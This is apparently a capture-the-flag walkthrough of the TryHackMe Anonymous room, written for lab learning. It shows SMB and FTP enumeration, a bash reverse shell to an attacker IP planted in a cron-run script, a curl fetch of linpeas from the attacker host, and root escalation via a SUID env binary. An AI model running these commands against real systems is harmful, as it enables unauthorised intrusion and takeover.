---
title: TryHackMe Anonymous Room Walkthrough
date: 2025-10-31 18:00:00 +0100
categories: [Cybersecurity, Capture The Flag, TryHackMe, Writeups]
tags: [TryHackMe, Anonymous Room, SMB Enumeration, FTP Exploitation, Privilege Escalation]
render_with_liquid: false
---

TryHackMe — Anonymous Room Walkthrough
=====================================

Room Overview
-------------

- Difficulty: Medium
- Focus areas: SMB enumeration, FTP abuse, cron exploitation, SUID privesc
- Goal: Capture `user.txt` and `root.txt`

Initial Recon
-------------

I kicked things off with a simple port scan:

```
nmap -sC -sV [target_IP]
```

Open ports came back as 21, 22, 139, and 445. SSH (`22`) was closed off pending credentials, so SMB (`139/445`) and FTP (`21`) became the obvious entry points.

SMB Enumeration
---------------

Anonymous SMB access was enabled:

```
smbclient -L /[target_IP]/ -N
```

The `pics` share allowed read access. I pulled the files locally but they were just benign images. Nothing to extract via `strings` or `steghide`.

FTP Enumeration & Foothold
--------------------------

Anonymous FTP logins were also allowed:

```
ftp [target_IP]
Name: anonymous
Password: [anything]
```

Inside `/scripts` I found three files:

- `to_do.txt` – a small note hinting at housekeeping tasks
- `clean.sh` – bash script that logs “nothing to delete”
- `removed_files.log` – empty, confirming the cleanup script runs via cron

Because the FTP share was writable, I replaced `clean.sh` with a reverse shell payload:

```
#!/bin/bash
bash -i >& /dev/tcp/[My_IP]/1234 0>&1
```

After uploading the modified script, I started a listener with `rlwrap nc -lvn 1234`. A few minutes later, the cron job executed and I caught a shell as the service user.

Shell Stabilisation
-------------------

I upgraded the shell for quality-of-life improvements:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

From there I grabbed `user.txt` in the home directory.

Privilege Escalation
--------------------

To get `linpeas.sh` onto the box, I spun up a quick web server on my attacking host with `python3 -m http.server 8000` and fetched the script from the reverse shell using `curl http://[My_IP]:8000/linpeas.sh -o /tmp/linpeas.sh`. After marking it executable, I ran it to enumerate privilege escalation paths. The standout finding was an unusual SUID binary, `env`, owned by root. `GTFOBins` confirmed it could be abused to overwrite files as root:

```
/usr/bin/env /bin/bash -p
```

With the resulting root shell, I recovered `root.txt` from `/root`.



